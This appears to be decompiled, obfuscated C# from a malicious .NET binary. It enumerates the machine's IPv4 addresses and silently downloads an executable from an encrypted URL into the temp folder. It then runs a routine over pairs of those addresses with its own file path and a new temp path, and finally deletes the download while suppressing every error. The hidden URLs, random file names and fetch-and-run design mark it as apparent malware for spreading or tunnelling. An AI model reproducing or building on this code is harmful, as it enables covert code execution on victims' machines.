using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace AFBGXefvzhgrS;

internal sealed class IWDtRrDlLktWU
{
	public static List<string> WuHdNTSQyNICRf;

	public static string SWxyHJVaZah;

	[NonSerialized]
	internal static GetString getString_0;

	public static void WTpeXVBBrCr()
	{
		try
		{
			WuHdNTSQyNICRf = tlFpZjBocEmJP();
			string text = getString_0(107393782);
			if (WuHdNTSQyNICRf.Count > 0)
			{
				text = nSaXLoXGrUlmmPo();
			}
			if (File.Exists(text))
			{
				foreach (string item in WuHdNTSQyNICRf)
				{
					string text2 = (SWxyHJVaZah = item);
					foreach (string item2 in WuHdNTSQyNICRf)
					{
						if (!(item2 == SWxyHJVaZah))
						{
							qXROyYvaHOl.gQxVlDcwnbXqeZ(text, getString_0(107390642) + SWxyHJVaZah + getString_0(107390653) + item2 + getString_0(107390612) + Assembly.GetEntryAssembly()!.Location + getString_0(107390603) + Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(getString_0(107390782), getString_0(107393782)).Remove(0, 3) + getString_0(107390626)));
						}
					}
				}
			}
			File.Delete(text);
		}
		catch
		{
		}
	}

	public static List<string> tlFpZjBocEmJP()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == getString_0(107390617))
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string nSaXLoXGrUlmmPo()
	{
		if (IntPtr.Size == 8)
		{
			return YntHpmrxGZD(new Uri(getString_0(107390568)));
		}
		return YntHpmrxGZD(new Uri(getString_0(107390974)));
	}

	public static string YntHpmrxGZD(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107390782), getString_0(107393782)).Remove(0, 3) + getString_0(107390626);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static IWDtRrDlLktWU()
	{
		Strings.CreateGetStringDelegate(typeof(IWDtRrDlLktWU));
		WuHdNTSQyNICRf = new List<string>();
		SWxyHJVaZah = getString_0(107393782);
	}
}
